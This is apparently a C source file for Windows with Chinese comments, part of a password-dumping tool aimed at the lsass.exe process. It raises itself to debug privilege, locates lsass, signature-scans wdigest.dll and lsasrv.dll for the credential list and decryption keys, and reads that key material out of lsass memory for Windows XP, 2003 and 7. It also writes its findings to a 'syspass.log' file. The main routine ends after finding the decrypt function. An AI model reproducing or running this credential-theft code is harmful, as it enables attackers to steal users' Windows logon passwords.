#include <stdio.h>
#include <Windows.h>
#include <stdlib.h>
#include <wchar.h>
#include <string.h>
#include "Crackpassword.h"
#pragma warning(disable:4996)
#pragma warning(disable:4703)



/*


typedef long (WINAPI *pNtQueryInformationProcess)(
	HANDLE  ProcessHandle,
	int  ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG           ProcessInformationLength,
	PULONG          ReturnLength
	);

//通过进程名，获得进程句柄
HANDLE GetProcessHandleByName(const char* szProcessName)
{

	//Windows APT
	//ntdll.dll
	//NtQueryInformationProcess();
	//NTSTATUS
	//FindFirstFile();给进程名字，不能给进程路径

	pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), " NtQueryInformationProcess");
	//遍历进程
	HANDLE hProcess = NULL;
	DWORD dwPID;
	for (dwPID = 4; dwPID < 20000; dwPID += 4)
	{
		//根据dwPID打开一个进程
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
		if (hProcess != NULL)
		{
			//查看
			wchar_t szBuffer[MAX_PATH];
			DWORD dwLength = 0;
			if (!NtQueryInformationProcess(hProcess, 27, szBuffer, sizeof(szBuffer), &dwLength))
			{

				//printf("%s\n",szBuffer);
				wchar_t* pszPash = (wchar_t*)((char*)szBuffer + 8);

				if (NULL != wcsstr(pszPash, L"\\lsass.exe"));
				return hProcess;
			}
		}
	}
	return NULL;
}


*/

HANDLE GetProcessHandleByName(const CHAR* szName)
{
	//
	// GetProcessHandle获得lsass.exe进程句柄
	//
	DWORD   ReturnLength, nBytes;
	WCHAR  Buffer[MAX_PATH + 0x20];

	//PWCHAR pRetStr;
	pNTQUERYPROCESSINFORMATION NtQueryInformationProcess;
	CHAR   szCurrentPath[MAX_PATH];

	//获取函数地址
	NtQueryInformationProcess = (pNTQUERYPROCESSINFORMATION)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryInformationProcess");

	// Process ID 一定是 4 的倍数
	DWORD dwProcessId;//进程ID
	HANDLE hProcess;//进程句柄
	for (dwProcessId = 4; dwProcessId < 10 * 1000; dwProcessId += 4)
	{
		//打开一个进程
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
		if (hProcess != NULL)
		{
			//将指定类型的进程信息拷贝到某个缓冲
			if (!NtQueryInformationProcess(hProcess, 27, Buffer, sizeof(Buffer), &ReturnLength))
			{
				//pRetStr = (PWCHAR)(*(DWORD *)((DWORD)Buffer + 4));
				/*
				"bd6\\Device\\HarddiskVolume1\\Windows\\System32\\smss.exe"
				"\\Device\\HarddiskVolume1\\Windows\\System32\\smss.exe"
				*/
				//去除前面4个字符
				PWCHAR pszPath = (PWCHAR)((char*)Buffer + 8);

				//将宽字符转换为多字节
				nBytes = WideCharToMultiByte(CP_ACP, 0, pszPath, -1, szCurrentPath, MAX_PATH, NULL, NULL);
				if (nBytes)
				{
					PCHAR pCurName = &szCurrentPath[nBytes - 1];
					while (pCurName >= szCurrentPath)
					{
						if (*pCurName == '\\')
							break;
						pCurName--;
					}
					pCurName++;
					if (lstrcmpi(szName, pCurName) == 0)
					{
						return hProcess;
					}
				}
			}
			// 关闭打开的句柄
			CloseHandle(hProcess);
		}
	}
	return NULL;
}

//
//根据密文关键指针特征码 KeyPointerSign[]获得密文存储的关键相关地址
//
LPVOID GetEncryptListHead()
{
	//LPVOID pEndAddr, KeyPointer, pTemp;
	//加载wdigest.dll模块，获取模块地址也就是模块基地址
	HINSTANCE hModWdigest = LoadLibrary("wdigest.dll");
	//获取函数SpInstanceInit地址  也就是结束地址
	LPVOID pEndAddr = GetProcAddress(hModWdigest, "SpInstanceInit");
	//当前指针 将模块基地址赋值给他
	LPVOID pTemp = hModWdigest;
	LPVOID KeyPointer = NULL;
	while (pTemp < pEndAddr && pTemp != NULL)
	{
		KeyPointer = pTemp;
		pTemp = (LPVOID)SearchBytes(
			(PBYTE)pTemp + sizeof(KeyPointerSign),	//起始地址
			(PBYTE)pEndAddr,						//结束地址
			KeyPointerSign,							//查找数据
			sizeof(KeyPointerSign));				//查找大小
	}

	KeyPointer = (LPVOID)(*(DWORD*)((DWORD)KeyPointer - 4));
	//释放模块
	FreeLibrary(hModWdigest);
	return KeyPointer;
}




void k8writeTxt(char* logtext)
{
	//写入txt
	FILE* pFile = NULL;
	pFile = fopen("syspass.log", "a+");

	// 12345/n5678/n 用sizeof 结果竟然只得到 1234
	//fwrite( ptext2,  sizeof(ptext2), 1, pFile );

	fwrite(logtext, strlen(logtext), 1, pFile);

	fclose(pFile); //关闭时会写入结束符
}




//提升进程权限
BOOL EnableDebugPrivilege(){

	//打开与进程相关联的访问令牌
	HANDLE hToken;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return FALSE;
	}

	//查看系统权限的特权值，返回信息到一个LUID结构体里
	LUID sedebugnameValue;
	if (FALSE == LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
		return FALSE;
	
	//调整访问令牌的特权
	TOKEN_PRIVILEGES tkp;
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = sedebugnameValue;

	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		return FALSE;
	}
	return TRUE;
}

void printSessionInfo(pLSAGETLOGONSESSIONDATA  LsaGetLogonSessionData, pLSAFREERETURNBUFFER LsaFreeReturnBuffer, PLUID pCurLUID)
{
	PSECURITY_LOGON_SESSION_DATA pLogonSessionData;

	LsaGetLogonSessionData(pCurLUID, &pLogonSessionData);
	printf("UserName: %S\n", pLogonSessionData->UserName.Buffer);
	printf("LogonDomain: %S\n", pLogonSessionData->LogonDomain.Buffer);

	LsaFreeReturnBuffer(pLogonSessionData);
}

//
// 在pBegin与pEnd之间搜索pBytes地址处的指定字节序列，字节个数为nsize
//
PBYTE SearchBytes(PBYTE pBegin, PBYTE pEnd, PBYTE pBytes, DWORD nsize)
{
	DWORD count;
	PBYTE pDst;

	while ((DWORD)pBegin + (DWORD)nsize <= (DWORD)pEnd)
	{
		pDst = pBytes;
		count = 0;
		while (count < nsize && *pBegin == *pDst)
		{
			pBegin++;
			pDst++;
			count++;
		}
		if (count == nsize)  break;
		pBegin = pBegin - count + 1;
	}
	if (count == nsize)
	{
		return (PBYTE)((DWORD)pBegin - (DWORD)count);
	}
	else
	{
		return NULL;
	}
}

//获得全局数据(lsasrv.data及解密KEY相关的数据)
void CopyKeyGlobalData(HANDLE hProcess, LPVOID hModlsasrv, int osKind)
{
	//节表（区块表） PE文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来描述一个节
	PIMAGE_SECTION_HEADER pSectionHead;
	//DOS头部是由IMAGE_DOS_HEADER结构体来定义的
	PIMAGE_DOS_HEADER     pDosHead;
	//PE头部是真正用来装载Win32程序的头部,该结构体包含PE标识符、文件头与可选头这三部分。该头部具有32位和64位之分
	PIMAGE_NT_HEADERS     pPEHead;
	DWORD                 dwBytes, dwBytesRead;
	LPVOID                pdataAddr, pDecryptKey, DecryptKey, pEndAddr;

	pDosHead = (PIMAGE_DOS_HEADER)hModlsasrv;

	//获取节表地址
	pSectionHead = (PIMAGE_SECTION_HEADER)(pDosHead->e_lfanew + (DWORD)hModlsasrv
		+ sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER));
	//节表数据地址 模块基地址+相对虚拟地址
	pdataAddr = (LPVOID)((DWORD)pSectionHead->VirtualAddress + (DWORD)hModlsasrv);
	//数据大小
	dwBytes = ((DWORD)(pSectionHead->Misc.VirtualSize) / 0x1000 + 1) * 0x1000;

	//根据进程句柄读入该进程的某个内存空间
	ReadProcessMemory(
		hProcess,		//正在读取的内存的进程的句柄
		pdataAddr,		//指向指定进程中要读取的基址的指针
		pdataAddr,		//指向缓冲区的指针，该缓冲区从指定进程的地址空间接收内容
		dwBytes,		//要从指定进程读取的字节数。
		&dwBytesRead);	//实际读取的字节数大小。指向一个变量的指针，该变量接收传输到指定缓冲区中的字节数。

	//PE头指针
	pPEHead = (PIMAGE_NT_HEADERS)(pDosHead->e_lfanew + (DWORD)hModlsasrv);
	//
	pEndAddr = (LPVOID)(pPEHead->OptionalHeader.SizeOfImage + (DWORD)hModlsasrv);

	switch (osKind)
	{
	case WINXP:
	case WIN03:
	{
		pDecryptKey = (LPVOID)SearchBytes(
			(PBYTE)(hModlsasrv),
			(PBYTE)pEndAddr,
			DecryptKeySign_XP,
			sizeof(DecryptKeySign_XP));

		pDecryptKey = (LPVOID) * (DWORD*)((DWORD)pDecryptKey + sizeof(DecryptKeySign_XP));
		ReadProcessMemory(
			hProcess,
			(LPVOID)pDecryptKey,
			&DecryptKey,
			4,
			&dwBytesRead);
		// DecryptKey 是与解密相关的关键地址
		ReadProcessMemory(
			hProcess,
			(LPVOID)DecryptKey,
			MemBuf,
			0x200,
			&dwBytesRead);
		pdataAddr = (LPVOID)pDecryptKey;

		*(DWORD*)pdataAddr = (DWORD)MemBuf;

		break;
	}
	case WIN7:
	{
		// WIN7 需调用这两个DLL中的函数进行解密
		LoadLibrary("bcrypt.dll");//加密解密库
		LoadLibrary("bcryptprimitives.dll");

		pDecryptKey = (LPVOID)SearchBytes(
			(PBYTE)(hModlsasrv),
			(PBYTE)pEndAddr,
			DecryptKeySign_WIN7,
			sizeof(DecryptKeySign_WIN7));

		pDecryptKey = (LPVOID)(*(DWORD*)((DWORD)pDecryptKey - 4));

		// DecryptKey 是与解密相关的关键地址
		ReadProcessMemory(hProcess, pDecryptKey, &DecryptKey, 0x4, &dwBytesRead);

		ReadProcessMemory(hProcess, (LPVOID)DecryptKey, MemBuf, 0x200, &dwBytesRead);

		pdataAddr = (LPVOID)pDecryptKey;
		*(DWORD*)pdataAddr = (DWORD)MemBuf;

		ReadProcessMemory(hProcess, (LPVOID)(*(DWORD*)((DWORD)MemBuf + 8)), SecBuf, 0x200, &dwBytesRead);

		pdataAddr = (LPVOID)((DWORD)MemBuf + 8);
		*(DWORD*)pdataAddr = (DWORD)SecBuf;

		ReadProcessMemory(hProcess, (LPVOID)(*(DWORD*)((DWORD)MemBuf + 0xC)), ThirdBuf, 0x200, &dwBytesRead);
		pdataAddr = (LPVOID)((DWORD)MemBuf + 0xC);
		*(DWORD*)pdataAddr = (DWORD)ThirdBuf;

		break;
	}
	}
	return;
}



int main()
{

	//DWORD     LogonSessionCount, i, dwBytesRead;
	//PLUID     LogonSessionList, pCurLUID, pListLUID;
	BYTE      EncryptBuf[0x200];

	//调节进程权限
	if (FALSE == EnableDebugPrivilege())
	{
		printf("调整进程权限失败.错误代码:%d\n", GetLastError());
		return 0;;
	}


	//根据进程名字，获取进程句柄
	HANDLE  hLsassProcess = GetProcessHandleByName("lsass.exe");
	if (hLsassProcess == NULL)
	{
		printf("通过进程名获取进程句柄失败.错误代码:%d\n", GetLastError());
		printf("尝试以管理员身份运行.\n");
		return 0;
	}


	OSVERSIONINFO VersionInformation;
	DWORD dwVerOff = 0, osKind = -1;
	//操作系统版本判断
	memset(&VersionInformation, 0, sizeof(VersionInformation));
	VersionInformation.dwOSVersionInfoSize = sizeof(VersionInformation);
	if (FALSE == GetVersionEx(&VersionInformation))
	{
		printf("获取操作系统版本失败.错误代码:%d\n", GetLastError());
		return 0;
	}
	
	if (VersionInformation.dwMajorVersion == 5)
	{
		if (VersionInformation.dwMinorVersion == 1)
		{
			dwVerOff = 36;
			osKind = WINXP;
		}
		else if (VersionInformation.dwMinorVersion == 2)
		{
			dwVerOff = 28;
			osKind = WIN03;
		}
	}

	else if (VersionInformation.dwMajorVersion == 6)
	{
		dwVerOff = 32;
		osKind = WIN7;
	}

	if (osKind == -1)
	{
		printf("[未知操作系统版本] 主版本号: %d 次版本号: %d\n", VersionInformation.dwMajorVersion, VersionInformation.dwMinorVersion);
		CloseHandle(hLsassProcess);
		return 0;
	}


	//获得解密函数地址
	HINSTANCE hModLsasrv = LoadLibrary("lsasrv.dll");
	if (hModLsasrv == NULL)
	{
		printf("加载lsasrv.dll模块失败.错误代码:%d", GetLastError());
		return 0;
	}

	pDECRIPTFUNC  DecryptFunc;
	//搜索指定地址处的解密函数特征值字节序列
	DecryptFunc = (pDECRIPTFUNC)SearchBytes((PBYTE)hModLsasrv,		//lsasrv模块句柄,模块基地址
		(PBYTE)0x7fffdddd,		//结束地址
		DecryptfuncSign,		//解密函数特征码
		sizeof(DecryptfuncSign));//字节个数


	return 0;




}